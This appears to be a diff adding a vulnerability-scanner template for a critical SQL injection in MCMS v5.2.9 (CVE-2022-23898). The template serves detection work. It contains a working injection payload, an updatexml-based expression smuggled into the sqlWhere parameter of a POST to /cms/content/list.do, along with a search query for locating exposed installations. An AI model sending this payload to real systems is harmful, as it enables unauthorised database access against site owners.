@@ -1,0 +1,46 @@
+id: mcms-list-do-sqli
+
+info:
+  name: MCMS list.do - SQL Injection
+  author: Co5mos
+  severity: critical
+  description: MCMS v5.2.9 contains a SQL injection vulnerability via the categoryId parameter in the file IContentDao.xml.
+  reference:
+    - https://gitee.com/mingSoft/MCMS/issues/I8MAJK
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2022-23898
+    cwe-id: CWE-89
+    epss-score: 0.02031
+    epss-percentile: 0.87716
+    cpe: cpe:2.3:a:mingsoft:mcms:5.2.9:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: mingsoft
+    product: mcms
+    fofa-query: app="铭飞/MCMS"
+  tags: cve,cve2022,sqli,mcms,mingsoft
+
+http:
+  - raw:
+    - |
+      POST /cms/content/list.do HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      X-Requested-With: XMLHttpRequest
+
+      categoryType=1&sqlWhere=%5b%7b%22action%22%3a%22and%22%2c%22field%22%3a%22updatexml(1%2cconcat(0x7e%2c(SELECT%20md5(999999999))%2c0x7e)%2c1)%22%2c%22el%22%3a%22eq%22%2c%22model%22%3a%22contentTitle%22%2c%22name%22%3a%22xxxx%22%2c%22type%22%3a%22input%22%2c%22value%22%3a%22111%22%7d%5d&pageNo=1&pageSize=10
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+
+      - type: word
+        part: body
+        words:
+          - "c8c605999f3d8352d7bb792cf3fdb25"
+        condition: and
